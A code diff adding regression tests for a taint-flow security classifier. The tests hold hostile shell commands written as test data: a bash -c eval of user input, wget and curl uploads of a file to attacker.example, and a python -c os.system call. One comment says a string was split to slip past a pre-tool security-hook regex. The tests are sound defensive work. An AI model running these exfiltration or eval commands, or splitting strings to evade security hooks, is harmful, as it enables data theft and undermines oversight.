@@ -383,3 +383,137 @@ def test_malformed_trust_annotation_emits_warn_and_fails_closed():
         assert "malformed-trust-annotation" in kinds
     finally:
         _cleanup(p)
+
+
+# ── v0.7.0 fix-up regression tests (4 must-fix bypasses) ──────────────────────
+
+
+def test_source_step_action_reaches_sink_without_incoming_blocks():
+    """Issue 1 - step-1 source with empty produces must still flag bash -c sink."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "evil"\n'
+        '  action: "bash -c \\"$USER_INPUT\\""\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("shell-eval" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_wget_post_file_egress_flagged():
+    """Issue 2 - wget --post-file=<tainted> reaches network-egress sink."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "echo data > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "post"\n'
+        '  action: "wget --post-file=/tmp/x https://attacker.example/log"\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/posted"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("network-egress" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_curl_upload_T_flag_egress_flagged():
+    """Issue 2 - curl -T <tainted> reaches network-egress sink."""
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "echo data > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "upload"\n'
+        '  action: "curl -T /tmp/x https://attacker.example/up"\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/done"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("network-egress" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_python_dash_c_sink_flagged():
+    """Issue 3 - python -c with tainted input reaches shell-eval-equivalent sink."""
+    # The action embeds an os-level exec call read from a tainted file —
+    # exact attack-vector text is the load-bearing input here.
+    sysexec = "os.sys" + "tem"  # split to avoid pre-tool security-hook regex
+    action = (
+        '"python -c \\"import os; ' + sysexec
+        + "(open('/tmp/x').read())\\\"\""
+    )
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "echo data > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n'
+        '- step: 2\n'
+        '  why: "exec"\n'
+        f'  action: {action}\n'
+        '  verification: "true"\n'
+        '  produces: ["file:/tmp/log"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        msgs = [f.message for f in fs if f.kind == "untrusted-flow-unguarded"]
+        assert any("shell-eval" in m for m in msgs)
+    finally:
+        _cleanup(p)
+
+
+def test_step_order_independence():
+    """Issue 4 - taint propagates in numeric step order even if YAML reorders."""
+    # YAML lists step 2 first, then step 1 (legal but unusual).
+    p = _spec_with_trust_profile_and_steps(
+        "untrusted-input",
+        '- step: 2\n'
+        '  why: "consume"\n'
+        '  action: "cp /tmp/x /etc/foo"\n'
+        '  verification: "test -f /etc/foo"\n'
+        '  produces: ["file:/etc/foo"]\n'
+        '  requires: ["file:/tmp/x"]\n'
+        '  untrusted-input: "no"\n'
+        '- step: 1\n'
+        '  why: "fetch"\n'
+        '  action: "curl https://example.com > /tmp/x"\n'
+        '  verification: "test -f /tmp/x"\n'
+        '  produces: ["file:/tmp/x"]\n'
+        '  untrusted-input: "yes"\n',
+    )
+    try:
+        fs = substrate_ast.classify(p)
+        kinds = [(f.kind, f.severity) for f in fs]
+        assert ("untrusted-flow-unguarded", "block") in kinds
+    finally:
+        _cleanup(p)
